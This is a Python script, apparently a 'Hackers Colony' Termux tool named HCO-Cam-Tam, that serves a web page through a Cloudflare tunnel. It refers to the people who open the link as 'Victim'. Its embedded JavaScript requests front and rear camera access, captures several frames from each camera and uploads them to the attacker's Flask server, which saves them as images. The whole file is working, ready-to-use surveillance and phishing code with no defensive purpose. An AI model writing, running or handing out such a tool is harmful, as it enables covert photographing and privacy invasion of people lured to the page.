#!/usr/bin/env python3
"""
HCO-Cam-Tam - Termux Camera Capture Tool
By Azhar (Hackers Colony)
"""

import os
import time
import base64
import subprocess
from datetime import datetime
from flask import Flask, request
from colorama import Fore, Style, init

init(autoreset=True)
app = Flask(__name__)

SAVE_PATH = "captured_images"
if not os.path.exists(SAVE_PATH):
    os.mkdir(SAVE_PATH)

YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"

# ---------------- Banner and Countdown ----------------
def banner():
    print(Fore.CYAN + "="*50)
    print(Fore.RED + Style.BRIGHT + "          HCO-Cam-Tam by Azhar")
    print(Fore.CYAN + "="*50)

def countdown():
    print(Fore.MAGENTA + "\nTool unlock starting in...")
    for i in range(8, 0, -1):
        print(Fore.YELLOW + f"{i}...", end=" ", flush=True)
        time.sleep(1)
    print(Fore.GREEN + "\nRedirecting to YouTube before proceeding...\n")
    time.sleep(2)
    os.system(f"am start -a android.intent.action.VIEW -d {YOUTUBE_LINK}")

# ---------------- Cloudflare Tunnel ----------------
def start_tunnel():
    print(Fore.CYAN + "[*] Starting Cloudflare Tunnel...")
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://127.0.0.1:8080"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    time.sleep(5)
    print(Fore.YELLOW + "[*] Cloudflare tunnel should be active now.")
    print(Fore.GREEN + "[*] Victim link: open your Cloudflare dashboard to get the public URL.")

# ---------------- Flask Routes ----------------
@app.route("/")
def index():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>HCO-Cam-Tam</title>
        <style>
            body { background:black; color:#39ff14; font-family: monospace; text-align:center; }
            h1 { color:#ff073a; }
        </style>
    </head>
    <body>
        <h1>HCO-Cam-Tam by Azhar</h1>
        <p>Allow camera access to capture images...</p>
        <script>
            async function captureImages() {
                let images = [];
                for (let cam of ["user","environment"]) {
                    let stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:cam } });
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    for(let i=0;i<5;i++){
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video,0,0);
                        let data = canvas.toDataURL('image/jpeg');
                        await fetch('/upload',{
                            method:'POST',
                            headers:{'Content-Type':'application/json'},
                            body: JSON.stringify({image:data})
                        });
                    }
                    stream.getTracks().forEach(track => track.stop());
                }
                document.body.innerHTML="<h2>Done Capturing!</h2>";
            }
            captureImages();
        </script>
    </body>
    </html>
    """
    return html

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    if "image" in data:
        img_data = data["image"].split(",")[1]
        filename = datetime.now().strftime("%Y%m%d_%H%M%S%f") + ".jpg"
        with open(os.path.join(SAVE_PATH, filename), "wb") as f:
            f.write(base64.b64decode(img_data))
        print(Fore.GREEN + f"[+] Image saved: {filename}")
    return "ok"

# ---------------- Main Execution ----------------
if __name__ == "__main__":
    banner()
    countdown()
    start_tunnel()
    print(Fore.CYAN + "[*] Starting Flask server on port 8080...")
    app.run(host="0.0.0.0", port=8080)
